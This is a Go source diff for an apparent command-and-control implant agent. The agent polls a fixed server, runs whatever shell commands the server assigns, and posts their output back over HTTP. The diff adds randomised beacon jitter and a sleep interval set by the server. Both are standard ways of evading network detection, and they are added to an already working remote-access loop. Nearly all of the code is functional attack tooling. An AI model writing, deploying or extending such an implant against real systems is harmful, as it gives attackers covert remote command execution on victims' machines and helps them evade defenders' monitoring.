@@ -7,18 +7,22 @@ import (
 	"io"
 	"net/http"
 	"os/exec"
+	"math/rand"
 	"time"
+	// "github.com/coder/websocket"
 )
 
 const (
 	ServerURL = "http://192.168.1.172:8080" 
-	AgentID   = "agent-linux-test"
+	AgentID   = "test"
 	PollDelay = 2 * time.Second
 )
 
 type PollResponse struct {
 	Status  string `json:"status"`
 	Command string `json:"command"`
+	Interval int    `json:"interval"` 
+    Jitter   int    `json:"jitter"`   
 }
 
 type OutputPayload struct {
@@ -26,9 +30,60 @@ type OutputPayload struct {
 	Output string `json:"output"`
 }
 
+
+
+
+//---------
+
+//ch-beacon
+func calculateSleep(baseInterval int, jitterPercent int) time.Duration {
+    if baseInterval <= 0 {
+        baseInterval = 5
+    }
+    if jitterPercent <= 0 {
+        return time.Duration(baseInterval) * time.Second
+    }
+
+    jitterMax := float64(baseInterval) * (float64(jitterPercent) / 100.0)
+    jitterOffset := (rand.Float64() * 2 * jitterMax) - jitterMax
+    finalInterval := float64(baseInterval) + jitterOffset
+
+    if finalInterval < 1 {
+        finalInterval = 1
+    }
+    return time.Duration(finalInterval * float64(time.Second))
+}
+
+func sendOutput(agentID string, output string) {
+	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
+	payload := OutputPayload{
+		ID:     agentID,
+		Output: output,
+	}
+
+	jsonData, err := json.Marshal(payload)
+	if err != nil {
+		fmt.Printf("[-] Error marshalling payload: %v\n", err)
+		return
+	}
+
+	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
+	if err != nil {
+		fmt.Printf("[-] Error sending output: %v\n", err)
+		return
+	}
+	defer resp.Body.Close()
+
+	fmt.Println("[+] Output sent back to server successfully.")
+}
+
+
 func main() {
 	fmt.Printf("[*] Starting agent %s...\n", AgentID)
 	fmt.Printf("[*] Polling server at %s every %v\n", ServerURL, PollDelay)
+
+	currentInterval := 5
+    currentJitter := 0
 
 	for {
 		// poll to server ep
@@ -49,11 +104,20 @@ func main() {
 		}
 
 		var pollResp PollResponse
+
 		if err := json.Unmarshal(body, &pollResp); err != nil {
 			fmt.Printf("[-] Error parsing JSON: %v\n", err)
 			time.Sleep(PollDelay)
 			continue
 		}
+
+        if pollResp.Interval > 0 {
+            currentInterval = pollResp.Interval
+        }
+        currentJitter = pollResp.Jitter
+
+
+
 
 		//exec assinged task
 		if pollResp.Status == "task_assigned" && pollResp.Command != "" {
@@ -81,29 +145,8 @@ func main() {
 		}
 
 		//poll delay
-		time.Sleep(PollDelay)
+		time.Sleep(calculateSleep(currentInterval, currentJitter))
 	}
 }
 
-func sendOutput(agentID string, output string) {
-	outputURL := fmt.Sprintf("%s/api/agent/output", ServerURL)
-	payload := OutputPayload{
-		ID:     agentID,
-		Output: output,
-	}
 
-	jsonData, err := json.Marshal(payload)
-	if err != nil {
-		fmt.Printf("[-] Error marshalling payload: %v\n", err)
-		return
-	}
-
-	resp, err := http.Post(outputURL, "application/json", bytes.NewBuffer(jsonData))
-	if err != nil {
-		fmt.Printf("[-] Error sending output: %v\n", err)
-		return
-	}
-	defer resp.Body.Close()
-
-	fmt.Println("[+] Output sent back to server successfully.")
-}
